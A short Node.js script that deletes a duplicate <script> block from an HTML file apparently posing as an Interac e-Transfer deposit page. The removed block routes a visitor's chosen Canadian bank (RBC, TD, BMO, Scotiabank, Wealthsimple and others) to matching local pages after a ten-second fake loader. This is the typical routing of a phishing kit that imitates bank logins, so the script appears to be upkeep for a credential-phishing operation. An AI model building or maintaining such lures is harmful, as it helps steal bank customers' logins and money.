import fs from 'fs';

let content = fs.readFileSync('public/main_interac.html', 'utf8');

const targetStr = `
<script>
// Dropdown selection handling
document.addEventListener('DOMContentLoaded', function() {
    var loader = document.getElementById('loaderOverlayInterac');
    
    var fiMapping = {
        'RBC': 'rbc101.html',
        'UNI': 'uni101.html',
        'ATB': 'atb101.html',
        'BMO': 'bmo101.html',
        'CIBC': 'cibc101.html',
        'Coast Capital': 'coastcapital101.html',
        'Desjardins': 'desjardins101.html',
        'KOHO': 'koho101.html',
        'Laurentian': 'laurentianbank101.html',
        'Meridian': 'meridian101.html',
        'National Bank': 'nationalbank.html',
        'Neo': 'neo101.html',
        'PC Financial': 'pcfinancial101.html',
        'Scotiabank': 'scotiabank101.html',
        'Simplii': 'simplii.html',
        'Tangerine': 'tangerine.html',
        'TD ': 'ca/en/dt101.html',
        'Vancity': 'vancity.html',
        'Wealthsimple': 'wealthsimple101.html'
    };

    function handleBankSelection(fiLabel) {
        if (!fiLabel) return;
        var targetFile = 'rbc101.html'; // Default
        
        for (var key in fiMapping) {
            if (fiLabel.toLowerCase().includes(key.toLowerCase())) {
                targetFile = fiMapping[key];
                break;
            }
        }
        
        if (loader) {
            loader.classList.add('active');
            setTimeout(function() {
                window.location.href = targetFile;
            }, 10000);
        } else {
            window.location.href = targetFile;
        }
    }

    // Intercept form submission
    var submitBtn = document.getElementById('depositSelectSubmit');
    if(submitBtn) {
        submitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            var fiLabel = '';
            var mainFiSelect = document.getElementById('selectFiId');
            var provSelect = document.getElementById('province');
            
            if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
                fiLabel = mainFiSelect.options[mainFiSelect.selectedIndex].text;
            } else if (provSelect && provSelect.value) {
                var activeCu = document.querySelector('.selectCu[provincecode="'+provSelect.value+'"] select');
                if (activeCu && activeCu.value && activeCu.value !== '') {
                    fiLabel = activeCu.options[activeCu.selectedIndex].text;
                }
            }
            
            if (fiLabel) {
                handleBankSelection(fiLabel);
            }
        });
    }
});
</script>
`;

content = content.replace(targetStr, '\n');
fs.writeFileSync('public/main_interac.html', content, 'utf8');
console.log('Cleaned duplicate block in main_interac.html');
